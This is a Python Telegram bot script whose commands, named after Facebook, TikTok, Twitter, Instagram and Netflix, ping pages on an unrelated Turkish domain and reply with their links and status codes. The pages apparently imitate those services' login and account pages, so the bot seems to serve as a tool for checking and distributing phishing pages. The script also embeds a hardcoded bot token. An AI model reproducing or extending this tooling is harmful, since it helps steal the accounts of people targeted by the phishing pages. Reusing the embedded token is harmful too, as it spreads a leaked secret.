from typing import Final
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import httpx  # For making HTTP requests

# Replace with your actual bot token
TOKEN: Final = '7706441917:AAFR7Mb7vGb2PjtADes1Fktdr0HfkEj61UA'
BOT_USERNAME: Final = '@GxbdtgdgvBot'

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hello! I'm a bot.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('How can I assist you /facebook /tiktok /twitter /instagram /netflix')

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("I don't understand that command.")

async def make_request(update: Update, context: ContextTypes.DEFAULT_TYPE, url: str, messages: list) -> None:
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(url)
            for message in messages:
                await update.message.reply_text(message.format(response.status_code))
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")

async def facebook(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    url = "https://season-event.com.tr/^*Y/FB/?id=934142412"  # Replace with the correct URL
    messages = [
        "facebook'v1:https://season-event.com.tr/^*Y/FB/api.php?id=934142412 {}",
        "facebook'v2:season-event.com.tr/^*Y/FB/?id=934142412   {}"
    ]
    await make_request(update, context, url, messages)

async def tiktok(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    url = "https://season-event.com.tr/^*Y/FB/?id=934142412"  # Replace with the correct URL
    messages = [
        "tiktok'v1:https://season-event.com.tr/^*Y/TK/?id=934142412 {}",
        "tiktok'v2:https://season-event.com.tr/^*Y/TK2/?id=934142412 {}"
    ]
    await make_request(update, context, url, messages)

async def twitter(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    url = "https://season-event.com.tr/^*Y/FB/?id=934142412"  # Replace with the correct URL
    messages = [
        "twitter:https://season-event.com.tr/^*Y/TW/?id=934142412  {}"
    ]
    await make_request(update, context, url, messages)

async def instagram(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    url = "https://season-event.com.tr/^*Y/IGX/?id=934142412"  # Replace with the correct URL
    messages = [
        "instagram'v1:https://season-event.com.tr/^*Y/IGX/?id=934142412 {}",
        "instagram'v2:https://season-event.com.tr/^*Y/IgV2/?id=934142412 {}"
    ]
    await make_request(update, context, url, messages)

async def netflix(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    url = "https://season-event.com.tr/^*Y/FB/?id=934142412"  # Replace with the correct URL
    messages = [
        "netflix:https://season-event.com.tr/^*Y/NT/?id=934142412    {}",
        "netflix'çc:https://season-event.com.tr/^*Y/NT/account.php?id=934142412    {}"
    ]
    await make_request(update, context, url, messages)

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("facebook", facebook))
    application.add_handler(CommandHandler("tiktok", tiktok))
    application.add_handler(CommandHandler("twitter", twitter))
    application.add_handler(CommandHandler("instagram", instagram))
    application.add_handler(CommandHandler("netflix", netflix))  # Add your command handlers here...
    application.add_handler(MessageHandler(filters.COMMAND, unknown))  # Handle unknown commands
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))  # Handle non-command messages

    # Start polling
    application.run_polling()

if __name__ == '__main__':
    main()
